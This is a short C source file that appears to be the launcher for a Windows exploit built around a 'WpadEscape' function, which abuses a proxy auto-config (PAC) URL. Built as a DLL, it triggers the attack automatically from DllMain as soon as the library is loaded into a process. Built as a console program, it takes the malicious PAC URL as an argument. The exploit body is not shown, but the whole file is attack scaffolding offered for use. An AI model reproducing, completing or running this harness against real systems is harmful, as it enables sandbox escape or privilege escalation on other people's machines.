#include <Windows.h>
#include <stdio.h>
#include <stdint.h>

#pragma comment(lib, "rpcrt4.lib")

#ifdef DLL_BUILD
BOOL
APIENTRY
DllMain(
    HMODULE hModule,
    DWORD   ul_reason_for_call,
    LPVOID  lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        WpadEscape(TARGET_PAC_URL);
        Sleep(INFINITE);
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }

    return TRUE;
}
#else

int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
    if (nArgc < 2) {
        DEBUG(L"No PAC URL argument provided");
    }
    else {
        WpadEscape(pArgv[1]);
    }

    return 0;
}
#endif